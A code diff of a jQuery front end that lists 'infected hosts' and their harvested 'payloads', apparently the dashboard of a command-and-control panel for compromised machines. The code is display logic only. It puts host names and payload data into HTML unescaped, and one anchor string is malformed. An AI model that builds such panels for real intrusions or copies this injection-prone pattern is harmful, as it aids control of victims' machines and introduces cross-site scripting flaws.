@@ -1,6 +1,8 @@
 console.log("hello world");
 
-$(function(){
+$(function () {
+
+
     const getInfectedHosts = (cb) => {
         return $.ajax({
             url: "/get_infected_hosts",
@@ -25,17 +27,43 @@ $(function(){
         });
     }
 
-    $("#search_form").submit(function(e){
-        getInfectedHosts((hosts) => {
-            for(let host in hosts) {
-                $("#infected_hosts").append("<li>" + host + "</li>")
-            }
-            // getPayloads(hosts[0], (payloads) => {
-            //     getPayload(hosts[0], payloads[0]['payload_id'], (data) => {
-            //         console.log(data);
-            //     });
-            // });
+    function toggleSiblingVisibility() {
+        const sibling = $(this);
+        if (sibling.css('display') === 'none') {
+            sibling.css('display', 'block');
+        } else {
+            sibling.css('display', 'none');
+        }
+    }
+
+
+    getInfectedHosts((hosts) => {
+        hosts.forEach((host) => {
+            getPayloads(host, (payloads) => {
+                const hostDiv = $("<div class=\"host_name\"> </div>");
+                const hostLink = $("<a href=\"#\" class=\"host_link\">" + host + "</a>");
+                hostLink.click(function () {
+                    $(this).siblings().each(toggleSiblingVisibility);
+                });
+                hostDiv.append(hostLink);
+                $("#infected_hosts").append(hostDiv);
+
+                payloads.forEach((payload) => {
+                    const userPayloadsDiv = $("<div class=\"user_payloads\"></div>");
+                    const userPayloadsLink = $("Name: <a href=\"#\" class=\"payload_name_link\"" + payload['name'] + "</a>");
+                    userPayloadsDiv.append(userPayloadsLink);
+                    getPayload(host, payload['payload_id'], (data) => {
+                        const payloadDataDiv = $("<div class=\"payload\">" + data + "</div>")
+                        hostDiv.append(userPayloadsDiv);
+                        hostDiv.append(payloadDataDiv);
+                    });
+                });
+            });
         });
+
+    });
+
+    $("#search_form").submit(function (e) {
         return false;
     });
 });
